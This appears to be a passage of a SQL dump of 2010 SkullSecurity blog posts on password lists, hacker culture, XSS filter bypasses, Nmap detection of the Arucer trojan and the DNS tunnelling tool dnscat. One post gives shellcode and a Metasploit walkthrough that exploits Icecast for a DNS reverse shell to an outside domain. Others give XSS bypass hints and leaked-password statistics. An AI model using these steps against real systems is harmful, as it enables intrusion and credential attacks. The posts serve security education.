Your system is now backdoored. To continue reading, go to Part 2: runtime analysis', '\'Malware\', \'Nmap\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2010/taking-apart-the-energizer-trojan-part-1-setup');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (71, 'Are you a “Real” hacker or just a skiddie?', 'Matt Gardenghi', '2010-3-23', 'This is yet another guest post from our good friend Matt Gardenghi! If you enjoy this one, don\'t forget to check his last one: Trusting the Browser (a ckeditor short story).\n------------------\nOften, I hear arguments that go like this: real hackers write code and exploits; everyone else is a script-kiddie.\nThat is a dumb argument from all sorts of levels.  For starters, those who make this observation are usually those who can write code.  Therefore, everyone who can\'t meet their personal standards/abilities as a coder are \"skiddies\" who demean the profession.\nI find it intriguing that everyone defines the basis for a good pentester by their own capabilities.  Clearly you think that you are good and it\'s normal to think that everyone will want to be good just like you.  Consequently, they should all do as you do, right?  Wrong.  We need diversity of backgrounds, skills, and opinions.  It\'s healthy not to inbreed (intellectually or otherwise).\n\nArrogance is the assumption that I set the standard.  So, let\'s not be arrogant.  None of us are so good that we objectively define the standard for all other pentesters.\nWe are all in a process of growing and developing.  We all started as \"skiddies\" and we all progressed from there.  Instead of drawing people onward in the profession, to many practitioners discourage those coming behind.  The \"experienced\" testers set the bar equal to their own skills and years of experience or to their skill set when they walked into their first pentesting job.  (Doubt me?  Go look at forums where someone asks what skills are necessary to be a pentester.  Every single answer is different and is based on the author\'s personal skill set and experiences.)  I may not have a tool in my toolkit that you have.  That doesn\'t mean I can\'t get the job done, I just might have to think differently and creatively to solve it in another way.\nI took GWAPT from Kevin Johnson and Seth Misenar.  Anyone care to call them skiddies?  They both walked into the field from other professions and lacked the ability to read much code or write much code.  They still don\'t consider themselves coders; they say that they hack code.  And yet they developed into experienced and qualified testers.  So why would you tell newcomers that they need a CS degree and the ability to read/write shellcode or else they aren\'t capable of being \"good?\"  You could be pushing away the next best security guy by telling him that he\'s not qualified to start.\nWe don\'t want everyone to be an expert in the same field.  That leads to a lopsided inbred situation.  Since no one person can be an expert in every field, we need people who specialize in shellcode and exploit writing.  We need others who are experts in working through website security including the process of abusing assumptions.  We need some who have the skillsets to combine and apply the multitude of tools created by others in new and creative ways.  We need to interact and support each other and recognize that we actually need each other and the diverse talents that others bring.\nI do think that all users should seek to understand what\'s going on in an exploit.  No one should fire off an exploit until they know A) it\'s not backdoored and B) whether it will hurt anything if it goes off badly.\nAs to those who wear their exploit writing skills on their sleeve?  Go for it.  It gives you a competitive advantage and you earned that.  Just recognize that you aren\'t the standard for the industry.  Other guys can often do the job competently and may meet the specific needs of the clients more effectively.  There is nothing wrong with that.  (For the record, I don\'t support people who call VA scans pentests.  That\'s a different issue.)\nI just think that we as an industry, need to recognize that people with differing skill-sets might be better suited to a particular job than we are.  That and everyone has to start somewhere.  So please, how about we stop defining skiddies as anyone missing a piece of our personal toolkit?', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/are-you-a-real-hacker-or-just-a-skiddie');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (72, 'Weaponizing dnscat with shellcode and Metasploit', 'Ron Bowes', '2010-3-18', 'Hey all,\nI\'ve been letting other projects slip these last couple weeks because I was excited about converting dnscat into shellcode (or \"weaponizing dnscat\", as I enjoy saying). Even though I got into the security field with reverse engineering and writing hacks for games, I have never written more than a couple lines of x86 at a time, nor have I ever written shellcode, so this was an awesome learning experience. Most people start by writing shellcode that spawns a local shell; I decided to start with shellcode that implements a dnscat client in under 1024 bytes (for both Linux and Windows). Like I always say, go big or go home!\n\nIf you just want to grab the files, here are some links:\n\nWin32 shellcode - assembler\nWin32 shellcode - binary\nWin32 shellcode - C array\nWin32 Metasploit module\nLinux shellcode - assembler\nLinux shellcode - binary\nLinux shellcode - C array\n\nIf you want to get your hands dirty, you can compile the source -- right now, it\'s only in svn:\nsvn co http://svn.skullsecurity.org:81/ron/security/nbtool\r\ncd nbtool\r\nmake\nThat\'ll compile both the standard dnscat client/server and, if you have nasm installed, the Linux and Windows shellcodes. On Windows, you\'ll need nasm to assemble it. I installed Cygwin, but you can compile the Windows shellcode on Linux or vice versa if you prefer. The output will be in samples/shellcode-*/. A .h file containing the C version will be generated, as well:\n$ head -n3 dnscat-shell-test.h\r\nchar shellcode[] =\r\n        \"\\xe9\\xa2\\x01\\x00\\x00\\x5d\\x81\\xec\\x00\\x04\\x00\\x00\\xe8\\x4e\\x03\\x00\"\r\n        \"\\x00\\x31\\xdb\\x80\\xc3\\x09\\x89\\xef\\xe8\\x2e\\x03\\x00\\x00\\x80\\xc3\\x06\"\r\n...\r\n\nAnd, of course, the raw file is output (without an extension), that can be run through msfencode or embedded into a script:\n $ make\r\n[...]\r\n$ wc -c samples/shellcode-win32/dnscat-shell-win32\r\n997 samples/shellcode-win32/dnscat-shell-win32\r\n$ wc -c samples/shellcode-linux/dnscat-shell-linux\r\n988 samples/shellcode-linux/dnscat-shell-linux\r\n\nUnless you want to be sending your cmd.exe (or sh) shell to skullseclabs.org, you\'ll have to modify the domain as well -- the very last line in the assembly code for both Windows and Linux is this:\nget_domain:\r\n call get_domain_top\r\n db 1, \'a\' ; random\r\n db 12,\'skullseclabs\' ; \nThe two lines with the domain have to be changed. The number preceding the name is, as the comment says, the length of the section (\'skullseclabs\' is 12 bytes, and \'org\' is 3 bytes). This process is automated with the Metasploit payload, as you\'ll see. \nEncoding with msfencode\nmsfencode from the Metasploit project is a beautiful utility. I highly recommend running shellcode through it before using it. The most useful aspect with shellcode is, at least to me, the ability to eliminate characters. So, if I need to get rid of \\x00 (null) characters from my strings, it\'s as easy as:\n$ msfencode -b \"\\x00\" < dnscat-shell-win32 > dnscat-shell-win32-encoded\r\n[*] x86/shikata_ga_nai succeeded with size 1024 (iteration=1)\r\n\nIf you\'re planning on using this in, for example, Metasploit, you don\'t have to worry about the msfencode step -- it\'ll do that for you. \nMetasploit payload\nSpeaking of metasploit, yes! I wrote a metasploit payload for dnscat. \nFirst, there are a number of caveats:\n\nThis is highly experimental\nThis doesn\'t have a proper \"exitfunc\" call -- it just returns and probably crashes the process\nThis is set up as a single stage, right now, and is 1000 or so bytes -- as a result, it won\'t work against most vulnerabilities\nThe dnscat server isn\'t part of Metasploit, yet, so you\'ll have to compile run it separately\n\nThat being said, it also works great when it\'s usable. The target I use for testing is Icecast 2 version 2.0.0 (WARNING: don\'t install vulnerable software on anything important!), which is included on the SANS 560 and 504 CDs (thanks Ed!). It\'s free, GPL, reliable, and has 2000 bytes in which to stuff the payload.\nSo, the steps you need to take are, \n\nInstall Icecast2 on your victim machine (Win32)\nDownload the experimental dnscat Metasploit module and put it in your Metasploit directory (modules/payloads/singles/windows/)\nFire up a dnscat server on your authoritative DNS server (dnscat --listen) -- see the dnscat wiki for more information\nRun Metasploit (msfconsole) and enter the following commands:\nmsf > use exploit/windows/http/icecast_header\r\n\r\nmsf exploit(icecast_header) > set PAYLOAD windows/dnscat-shell-win32\r\nPAYLOAD => windows/dnscat-shell-win32\r\n\r\nmsf exploit(icecast_header) > set RHOST 192.168.1.221\r\nRHOST => 192.168.1.221\r\n\r\nmsf exploit(icecast_header) > set DOMAIN skullseclabs.org\r\nDOMAIN => skullseclabs.org\r\n\r\nmsf exploit(icecast_header) > exploit\r\n[*] Exploit completed, but no session was created.\r\n\nMeanwhile, on your dnscat server, if all went well, you should see:\n$ sudo ./dnscat --listen\r\nWaiting for DNS requests for domain \'*\' on 0.0.0.0:53...\r\nSwitching stream -> datagram\r\nMicrosoft Windows [Version 5.2.3790]\r\n(C) Copyright 1985-2003 Microsoft Corp.\r\n\r\nC:\\Program Files\\Icecast2 Win32>\r\n\nYou can type commands in, and they\'ll run just like a normal shell. Be warned, though, that it is somewhat slow, due to the nature of going through DNS. \nWhy bother?\nThe big advantage to this over traditional shellcode is that no port, whether inbound or outbound, is required! As long as the server has a DNS server set that will perform recursive lookups, it\'ll work great!\nFeedback\nAs I said, this is the first time I\'ve ever written shellcode or x86. I\'m sure there are lots of places where it could be significantly improved, and I\'d love to hear feedback from the folks who really know what they\'re doing and can help me improve my code. \nThanks!', '\'DNS\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2010/weaponizing-dnscat-with-shellcode-and-metasploit');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (73, 'robots.txt: important if you’re hosting passwords', 'Ron Bowes', '2010-3-16', 'This is going to be a fun post that\'s related to some of my password work. Some of the text may not be PG13, so parental discretion is advised. \nAs most of you know, I\'ve been collecting password lists. In addition to normal password lists that are useful in bruteforcing, I have a (so far) lame collection of non-hacking dictionaries. Things like cities, English words, etc. \nThere was a time when the biggest dictionary I had, weighing in at 6.4mb, was a German wordlist. 6.4mb doesn\'t sound like much, but at the time I was on a DSL connection; with about 400kbit upstream (on a good day), I could feel every download.\n\nAfter awhile, I started realizing that german.txt was being downloaded pretty regularly. Far more regularly than any other lists. This didn\'t make any sense to me -- were German hackers stockpiling their tools before 202(c) came into effect? Were people interested in what Germans were using for passwords? Were people trying to cheat at German Boggle? I wasn\'t sure! \nAt that point, I removed the files and didn\'t worry too much about it. It wasn\'t worth hosting. \nFast forward a year or two. A friend of mine, who we affectionately call \"The German\", was doing some research into referer logs for different sites, and asked if he could have the referer log  skullsecurity.org. I happily obliged, and asked him if he could figure out why so many people were downloading my German password list (he\'s German himself, after all). The referer entries he found made us laugh. There were thousands, but here are a few:\n\nhttp://www.google.de/search?q=1%20cm%20dicker%20anleimer%20wie%20hinlegen%20beim%20trocknen -> German_list.txt\nhttp://www.google.de/search?q=Du%20singst%20shake%20your%20ass%20und%20wackelst%20mit%20dem%20kopf -> German_list.txt\nhttp://www.google.de/search?q=schuh%20bode%20cowboy%20stiefel -> German_list.txt\nhttp://www.google.de/search?q=Drillinge%2BIchstedt -> German_list.txt\nhttp://www.google.de/search?q=porn+bemastung -> German_list.txt\nhttp://www.google.de/search?q=masth%c3%bchner+von+gut+deutsch-nienhof -> German_list.txt\nhttp://www.google.de/search?q=teuerste+sexpuppe+Real+Dolls+shop -> German_list.txt\nhttp://www.google.de/search?q=lolita+sexfilm+ohne+jeglichen+geb%C3%BCrhen -> German_list.txt\n\nAnd, of course, my absolute favourite:\n\nhttp://www.google.de/search?q=porno+ porn+ comics+ cartoon+ hardcore+ gropers+ raped+ Asian+ porn,Asian+ porn+ movies,Asian+ porn+ video,Asian+ idol+ movies,Asian+ idol+ porn+ wild+ japan+ porn,+ asian+ porn+ videos,+ free+ japanese+ porn,+ asian+ sex+ movies,+ orienta+ porn,+ japan+ porn,+ asian+ porn,+ asian+ sex -> German_list.txt\n\nNow, I don\'t know German, and I\'m pretty they aren\'t all questionable. Google Translate tells me that one is about cowboy boots. I do, however, recognize some somewhat more naughty words; words that really shouldn\'t be associated with my site. \nSo, the moral of the story is: hosting wordlists can get you some pretty interesting search results. If that\'s what you\'re into, let me know and I\'ll send you a list of keywords to put on your site. :)\nNow? I host my passwords on a separate domain with a robots.txt file. No more wacky referers!', '\'Passwords\'', 'https://blog.skullsecurity.org/2010/robots-txt-important-if-youre-hosting-passwords');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (74, 'The ultimate faceoff between password lists', 'Ron Bowes', '2010-3-11', 'Yes, I\'m still working on making the ultimate password list. And I don\'t mean the 16gb one I made by taking pretty much every word or word-looking string on the Internet when I was a kid; that was called ultimater dictionary. No; I mean one that is streamlined, sorted, and will make Nmap the bruteforce tool of the future!\n\nFirst, a sidenote: JHaddix from Security Aegis posted a story mentioning my password lists and noted \"I\'d grab these lists if you dont already have them, who knows how long they will stay up.\" He makes a great point -- if I\'m asked to remove these lists, I\'ll have no choice (for what it\'s worth, I don\'t see why I would; I cleared it with my ISP before hosting them). But, just in case, I wrapped everything up in a single tarball: skullsecurity-lists.tar.bz2. Weighing in at 132mb, it contains my whole collection of password lists. Feel free to grab it! If you want to pick and choose, as always, check out my password page. \nSo anyway, on the subject of generating awesome password lists, Brandon Enright from the Nmap team is trying to come up with an algorithm to rank the different words in the different lists. Meanwhile, I spent some time graphing potential password dictionaries\' success against leaked password lists to see which one was best. \nThese are the dictionaries I used:\n\nJohn the ripper\nMyspace (Nmap\'s original)\nPhpbb (cracked by Brandon Enright)\nRockyou.com (my favourite; not that I\'m biased)\nConficker (which I already knew would suck)\n\nAnd I put them up against some of the best leaked password lists I\'ve collected:\n\nRockyou\nPhpbb\nHotmail\nMyspace\nHak5\nFaithwriters\nElitehackers\n500 worst passwords\n\n(Obviously, where there\'s overlap, I didn\'t count the password cracking its own list; it wouldn\'t really be fair to crack Rockyou.com passwords using the Rockyou.com list -- I did that in an earlier blog to measure coverage, though, if you want to check that out). \nBecause we want smaller lists, I used the top 1, 10, 50, 100, 200, 500, 1000, 2000, and 5000 passwords from each list, and measured how many of the original passwords it would crack. The best possible result, obviously, is to have points at {100,100}, {1000,1000}, etc. (dependent on the size of the target list). Naturally, that didn\'t happen anywhere, but it was close on a couple (the phpbb password list, for example, almost perfectly cracked Rockyou.com -- more because Rockyou.com is big than because phpbb is complete, but you get the picture).\nEnough talk, here are the results (note: each graph represents a target, and the lines represent the dictionaries):\n\n\n\n\n\n\n\n\nConclusion\nI think the conclusions here are:\n\nRockyou.com and phpbb are the best lists (props to Brandon for cracking the phpbb passwords!)\nConficker is a clear loser -- I wonder if Conficker would have done better if the authors spent more time generating its dictionary?\nNo dictionary is perfect -- no dictionary won in every match. That\'s why we need to rank words and make the perfect one!\nOpenOffice.org 3 makes sexy graphs!\n\nOn the next episode of Skullsecurity.org..... why you need robots.txt if you\'re hosting dictionaries, especially German ones.', '\'Nmap\', \'Passwords\'', 'https://blog.skullsecurity.org/2010/the-ultimate-faceoff-between-password-lists');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (75, 'Trusting the Browser (a ckeditor short story)', 'Matt Gardenghi', '2010-3-9', 'My name is Matt Gardenghi.  Ron seems to think it important that this post be  clearly attributed to someone else (this fact might worry me).  I\'m an occasional contributor here (see: Bypassing AV).  I handle  security at Bob Jones University and also perform pentests on the side.   (So if you need someone to do work, here\'s my shameless plug.)  I have  acquired the oddly despised CISSP and the more respectable GCFA, GPEN,  and GWAPT.\n------------------\nI know a company that purchased some Web 2.0 services.  We\'ll leave it at that, to protect the guilty.  :-p\nSo, one day a bored user decided that the editor used on the site was annoying.  He used GreaseMonkey to replace the editor with his preferred editor.  This was \"Clue #1\" that a problem existed with the Web 2.0 service.\n\nFast forward four months.  [Many, many, many]^2 security holes and fixes later, the \"web 2.0\" service has been secured....  They had an audit that found that they passed XSS testing.  This is Clue #2.  You don\'t start with Mack Truck sized holes and claim to be perfectly secure three months later.  It just doesn\'t happen.  Either the audit was bad (likely low grade as it claimed to focus on the OWASP Top 10), or something.  A good audit should have found more.\nFast forward another three months.  Within ten minutes, slightly more esoteric forms of XSS work.  Ron once showed me how you could use the onerror=\"javascript:stuff\" piece of the HTML image tag to bypass filtering.  (Hint: it works)  Clue #3; problems still exist.  But hey, who\'s content with an esoteric XSS attack in a backwater location on the service?  Not me anyway. Remember the user who rewrote the page via GreaseMonkey?  Yeah, let\'s go back to that.  In another section of the service, I found that the ckeditor had a \"Source\" toggle.  Well, now, this is fun.  I can do lot\'s of fun stuff there.  But again, it\'s the backwoods.  In the main locations the \"Source\" toggle is disabled.\nWell, to compress about 30 minutes into one sentence, I figured out how to re-enable it.  Hint: Just add \" Source \" to the toolbars in the config.js file as it comes to your browser.  (You *do* use an interception proxy don\'t you?)  This web 2.0 service thought that the absence of a \"source\" button and the built in ckeditor cleaning was protecting them.  Not so much.\nSo, now we have a simple way to stuff gunk* into the web page.  Unless the site re-filters the data from ckeditor on insert into the DB or upon output, we have all sorts of hacking going on. *gunk == BeEF.\nIn retrospect, this was the hard way of doing it.  It works, but if you are going to the work of proxies, there\'s a faster solution.  Just modify the POST parameters.  (Realizing this was a face-palm moment.  Oh well, live and learn.)\nIn this case, the problem is that the web 2.0 service instituted security by the rules.  They were told to secure xyz, so they did.  They didn\'t comprehend the reasons for securing it nor how a bad guy would attempt to bypass it; they failed to comprehend the bigger picture.  They treated security as a point in time event and not a treadmill that never ends.  (Depressing imagery but correct.)\nEnsure that your devs recognize the threat  and how it can be exploited.  Educate them, otherwise these sorts of holes will just happen to your company on a continuous basis.\nNext time you see a WYSIWYG editor, try manipulating the POST parameters and see if they are checking the results on the server.  Let me know how it goes in the comments below or on twitter: @matt_gardenghi or email me at mtgarden -at- gmail.\nEnjoy.', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/trusting-the-browser-a-ckeditor-short-story');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (76, 'Using Nmap to detect the Arucer (ie, Energizer) Trojan', 'Ron Bowes', '2010-3-8', 'Hey,\nI don\'t usually write two posts in one day, but today is a special occasion! I was reading my news feeds (well, my co-op student (ie, intern) was -- I was doing paperwork), and noticed a story about a remote backdoor being included with the Energizer UsbCharger software. Too funny!\n\nThis Trojan listens for commands on port 7777. US-CERT\'s alert contains some Snort signatures that\'ll detect it for you, but only if somebody\'s using it. If you want to actively detect infections, you\'ll need to use a scanner; as always, Nmap to the rescue! I spent the morning, along with my co-op student, reverse engineering enough of this Trojan to write an Nmap signature for it. \nTo detect this Trojan, you\'ll either need the latest build of Nmap (as of today), or to download the new nmap-service-probes file. Then, simply run a version scan against port 7777 (see below).\nOption 1: latest build\nIf you are using Linux, I suggest simply checking out the latest SVN version of Nmap:\n$ svn co --username=guest --password=\"\" svn://svn.insecure.org/nmap ./nmap-svn\r\n$ cd nmap-svn\r\n$ ./configure && make\r\n$ make install\nOption 2: update nmap-service-probes\nFirst, find the file on your system called nmap-service-probes. On Windows, it\'ll likely be in c:\\Program Files\\Nmap. On Linux, check /usr/share/nmap and /usr/local/share/nmap. When you find it, replace it with the latest version from Nmap\'s site:\n\nhttp://nmap.org/svn/nmap-service-probes\n\nPerform the scan\nSince it\'s implemented as a simple version probe, all you have to do is scan port 7777 with the version scan option (-sV):\nnmap -sV -p7777 <target>\nIf you\'re infected, you\'ll see the following output:\n$ nmap -sV -p7777 10.0.0.222\r\n\r\nStarting Nmap 5.21 ( http://nmap.org ) at 2010-03-08 12:39 CST\r\nNmap scan report for 10.0.0.222\r\nHost is up (0.0031s latency).\r\nPORT     STATE SERVICE VERSION\r\n7777/tcp open  arucer  Arucer backdoor (**BACKDOOR**)\r\nService Info: OS: Windows\r\n\nWarning!\nThis technique isn\'t 100% reliable (because of the Trojan, not because of me!). I\'ve found that the service occasionally goes into an infinite loop trying to receive data, and sometimes it\'ll disconnect you right away (showing up as tcpwrapped). So, use caution, and ensure you have up to date virus signatures!\nMore?\nThis was actually a fun executable to reverse engineer. It\'s pretty simple, and isn\'t packed, so it\'s a good \"my first malware\" type of executable. If anybody is interested in more information about it, let me know and I\'ll see if I can do up a tutorial on how I made this signature! My email address is at the right, ron-at-skullsecurity.net and my Twitter account is iagox86. Drop me a line!\nUPDATE: Looks like Metasploit has a payload to take advantage of this vulnerability. Sweet! Find the hosts with Nmap, exploit with Metasploit. Win!', '\'Malware\', \'Nmap\'', 'https://blog.skullsecurity.org/2010/using-nmap-to-detect-the-arucer-ie-energizer-trojan');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (77, 'Hard evidence that people suck at passwords', 'Ron Bowes', '2010-3-6', 'Hey everybody! \nAs you probably know, I\'ve been working hard on generating and evaluating passwords. My last post was all about Rockyou.com\'s passwords; next post will (probably) be about different groups of passwords from my just updated password dictionaries page. This will be a little different, though.\n\nSo, we all know that people frequently choose stupid passwords like \'password\', \'123456\', etc. I\'m sure a good part of the reason is that they just don\'t care. My mother, who isn\'t a tech savvy person and who rarely uses computers, was trying to get new games for her iPod today. When it prompted her for a password, we went through the semi-annual tradition of trying to figure out what we set. Since her credit card is linked to this account, it\'s a fairly important one. \nI personally use the password \'password\' or \'Password1\' on a fairly regular basis when I create throwaway accounts. Lots of sites make you create accounts to download por... err, software (VMWare comes to mind). Normally, if Bugmenot doesn\'t have the proper password, I\'ll just fill out the forms with garbage info, a fake email, and a lazy password. And I\'m sure I\'m not the only one -- I wouldn\'t be surprised if that\'s where a lot of the really awful passwords came from. \nBesides the common stupid passwords, people will often use the name of the site. Rockyou.com\'s (WARNING: big download) 8th most popular password is \'rockyou\', phpbb\'s 3rd most popular password is \'phpbb\', and faithwriters\' 10th most popular password is \'faithwriters\' (the second most popular is \'writer\', which narrowly edges out \'jesus1\'). I suspect that phpbb has the highest ranked name simply because it\'s easy to type. My point is, if you\'re trying to protect your site, protect your users by using a blacklist like Twitter does in addition to a good password policy. And, of course, if you\'re trying to break into a site, the name of the site is a great starting point!\nOn the topic of \'jesus1\' being Faithwriters\' second most common password, we all know that people tend to use passwords related to their hobbies, interests, etc. Ed Skoudis, Kevin Johnson, and others have spoken at length about harvesting passwords from social networking sites, and I don\'t doubt that you\'ll have amazing success if you do it. Just look at this comparison between phpbb\'s password list, faithwriters.com\'s password list, and elite-hackers.com\'s password list:\n\n\nphpbb\nFaithwriters\nElite hackers\n\n\n\n\n123456\npassword\nphpbb\nqwerty\n12345\n12345678\nletmein\n111111\n1234\n123456789\n\n\n\n\n123456\nwriter\njesus1\nchrist\nblessed\njohn316\njesuschrist\npassword\nheaven\nfaithwriters\n\n\n\n\n123456\npassword\n12345\npassport\ndiablo\nalpha\n12345678\n1\nzxcvbnm\ntrustno1\n\n\n\n\nSo, some trends are pretty obvious here. phpbb, which a fairly neutral site in terms of its userbase, has a list of 10 pretty lame passwords (including \'phpbb\', as I mentioned earlier). \nFaithwriters has a bunch of passwords that are religious sounding, which makes sense because it\'s a religious site. Besides \'writer\' and \'faithwriters\', we see \'jesus1\', \'christ\', \'blessed\', \'john316\', etc. In fact, 6 of the top 10 passwords are religious in nature, and 8 of the top 10 passwords are ones you wouldn\'t expect to see anywhere else. And that\'s really the key here -- the majority if the passwords will *not* be found with a standard password dictionary, but *will* be found with a custom dictionary, tailored to the site! \nAnd finally, elite-hackers.com\'s list has several of the usual stupid passwords, but has a couple that you wouldn\'t generally see, such as \'diablo\', \'alpha\', and, of course, our favourite secret agent\'s password, \'trustno1\'. \nSo, this is some good hard data that supports something we\'ve been saying for a long time: if you really want to get access to a network, build a custom password list based on what you know about them. You\'ll be happy you did! \nPS: In case you\'re wondering, yes; my mom remembered her iPod password and is happily playing her games.', '\'Passwords\'', 'https://blog.skullsecurity.org/2010/hard-evidence-that-people-suck-at-passwords');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (78, 'How big is the ideal dick…tionary?', 'Ron Bowes', '2010-3-4', 'Hey all,\nAs some of you know, I\'ve been working on collecting leaked passwords/other dictionaries. I spent some time this week updating my wiki\'s password page. Check it out and let me know what I\'m missing, and I\'ll go ahead and mirror it. \nI\'ve had a couple new developments in my password list, though. Besides having an entirely new layout, I\'ve added some really cool data!\n\nRockyou.com passwords\nOne of the most exciting things, at least to me, is the Rockyou.com passwords (story). Back in 2009 (I realize that\'s a long time ago -- my friends would yell \'OLD!\' if I tried talking about it on IRC), 32.6 million passwords (14.3 million unique passwords) were stolen from Rockyou.com. These passwords were not encrypted/hashed and were stolen through, I believe, SQL injection. This attack was incredibly useful, at least from my perspective, because that\'s a HUGE number of passwords. Basically, it\'s a perfect cross section of the passwords people use when they aren\'t restricted. \nI\'m mirroring a few versions of the Rockyou.com password list on my password page, so go grab a copy if you want one (the full list is 50mb+ compressed). Just for fun, the top 10 passwords, which were used by 4.66% of all users on Rockyou.com, were:\n\n123456\n12345\n123456789\npassword\niloveyou\nprincess\n1234567\nrockyou\n12345678\nabc123\n\nPassword coverage\nWhen talking about dictionary sizes, the question often comes up: does size really matter? The answer, I\'m assured by experts is, \'yes\'. But what\'s the ideal size (for sanctioned penetrations, of course)?\nSo, here\'s the question: how many accounts can be cracked with the top-X passwords? Let\'s start by looking at a graph:\n\nAs you can see, there\'s some definite diminishing returns there. I was actually excited that the graph looks exactly how I thought it\'d look. Pretty sweet!\nNow, let\'s look at in a less exciting but more useful table form:\n\n\nPasswords\nCoverage\n\n\n1\n2.03%\n\n\n2\n2.58%\n\n\n5\n3.88%\n\n\n10\n4.66%\n\n\n20\n5.67%\n\n\n50\n7.83%\n\n\n100\n10.34%\n\n\n200\n13.71%\n\n\n500\n19.82%\n\n\n1000\n25.68%\n\n\n2000\n32.60%\n\n\n5000\n42.62%\n\n\n10000\n50.68%\n\n\n20000\n59.33%\n\n\n50000\n72.40%\n\n\nWhat\'s that mean? It means that if you take the top 10 passwords, you would have cracked 4.66% of accounts on Rockyou.com. The top 100 passwords would have gotten you 10.34% of the Rockyou.com accounts, and so on. That\'s cool to know, but isn\'t as useful for penetration testing. Let\'s go by coverage instead of count (I\'ve included links to the password files, as well -- the same links you\'ll find on my wiki):\n\n\nPasswords\nCoverage\nDownload\n\n\n13\n4.99%\nrockyou-5.txt (104 bytes)\n\n\n92\n10.00%\nrockyou-10.txt (723 bytes)\n\n\n249\n15.01%\nrockyou-15.txt (1,943 bytes)\n\n\n512\n20.00%\nrockyou-20.txt (3,998 bytes)\n\n\n929\n25.00%\nrockyou-25.txt (7,229 bytes)\n\n\n1556\n30.00%\nrockyou-30.txt (12,160 bytes)\n\n\n2506\n35.00%\nrockyou-35.txt (19,648 bytes)\n\n\n3957\n40.00%\nrockyou-40.txt (31,220 bytes)\n\n\n6164\n45.00%\nrockyou-45.txt (49,133 bytes)\n\n\n9438\n50.00%\nrockyou-50.txt (75,912 bytes)\n\n\n14236\n55.00%\nrockyou-55.txt (115,186 bytes)\n\n\n21041\n60.00%\nrockyou-60.txt (170,244 bytes)\n\n\n30290\n65.00%\nrockyou-65.txt (244,535 bytes)\n\n\n42661\n70.00%\nrockyou-70.txt (344,231 bytes)\n\n\n59187\n75.00%\nrockyou-75.txt (478,948 bytes)\n\n\nThis is essentially the same table -- I just based the rows on the coverage instead of the number of passwords. With this table you can determine, for example, that to crack 10% of users\' passwords, you only need to try the top 92 passwords. I put the same table and links on my password page. \nphpbb passwords\nOne last interesting change on my password page is the addition of Brandon Enright\'s cracked phpbb passwords. As I\'m sure you all know, Phpbb had its password list stolen some time ago (closing in on two years, maybe?). Since then, Brandon has been diligently working to crack every single md5 password, and has mostly succeeded (over 97% cracked, I believe). He was kind enough to share that list with me, and it\'s now mirrored on my password page so check it out!', '\'Hacking\'', 'https://blog.skullsecurity.org/2010/how-big-is-the-ideal-dick-tionary');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (79, 'DNS Backdoors with dnscat', 'Ron Bowes', '2010-2-23', 'Hey all,\nI\'m really excited to announce the first release of a tool I\'ve put a lot of hard work into: dnscat.\nIt\'s being released, along with a bunch of other tools that I\'ll be blogging about, as part of nbtool 0.04.\n\nWhat can dnscat do?\ndnscat was designed in the tradition of Netcat and, more recently, Ncat. Basically, it lets two hosts communicate with each other via the DNS protocol. One of my favourite features is the --exec flag, which lets you tunnel a shell (or a netcat socket) through the DNS protocol -- how awesome is that?\nCommunicating by DNS is great because the client only needs the ability to talk to a single DNS server, any DNS server on the Internet (with recursion enabled). dnscat will, by default, use the system DNS server, which should cover basically every case. Firewalls aren\'t going to stop you from talking to your local DNS server, right? And I don\'t know about the average network, but on ours there are thousands of DNS queries every minute, so a little bit of extra traffic just gets lost in the flow. \nIn brief, dnscat works by taking advantage of DNS recursion. It sends messages to the authoritative nameserver for a domain, which is the key -- to be a server, you have to be the authoritative nameserver for a domain. For example, I\'m the authoritative server for skullseclabs.org, so any requests that end with .skullseclabs.org, no matter where they originate, will eventually connect to 208.81.2.52 (my current address). \nIf you want more details, check out the full documentation:\n\ndnscat\nnbtool\n\nWhere do I get dnscat?\nFor complete instructions on how to download and install it, check out the download section in the nbtool documentation -- dnscat is a standalone executable that comes with nbtool. \nYour best bet is to compile from source, if you\'re on a *nix system. I\'ve tested it on every system I can get my hands on, and it compiles and works great. That being said, I\'ve also created a few binary packages for good measure (primarily Windows, but also 32- and 64-bit Slackware, which might run on other Linux distributions). \nAt some point in the future, I\'d like to be able to generate .rpm and .deb files, but I have no experience with that. \nWhich operating systems does dns support?\nI have compiled and tested it on:\n\nSlackware 13 (32- and 64-bit)\nWindows 2000, XP, 2003 (Visual Studio)\nFreeBSD 7.2 and 8 (32- and 64-bit)\nMac OS X (10.6, I think)\n\nI expect it\'ll compile on any modern Linux or Windows system with either gcc or Visual Studio. My code is reasonably POSIX compliant, and has no external library dependencies.\nHow do I use dnscat?\nI thought you\'d never ask! \nThe biggest hurdle to using dnscat is becoming an authoritative nameserver. You have to register a domain and point its nameservers at your own address. That takes some effort and money, but the payback, in my opinion, is great! Full two-way communication from anywhere on the Internet without worrying firewalls?\nIf you think you have the authoritative nameserver for your domain but aren\'t sure, you can use dnscat\'s --test command (or run dnstest):\ndnstest --domain \nor\ndnscat --test \nOnce you have your authoritative nameserver set up and you want to try it out, you can create a server like this (on the authoritative server):\ndnscat --listen\nThen, on the client (anywhere on the Intenet), you can run:\ndnscat --domain <yourdomain>\nThere\'s a lot more you can do, of course. My favourite is the --exec command, which can run an application over dns on either the server or the client (works best on the client). With --exec, you can tunnel a shell over DNS or forward a connection through it using netcat. \nIf you want some different examples, including how to tunnel a shell or how to tunnel a socket (ssh session), check out the examples/usage section of the documentation. If you\'d like to contribute your own examples or use cases, please do! Or, if you have an idea and would like me to figure out how to do it, that\'s good too. \nCan I implement my own 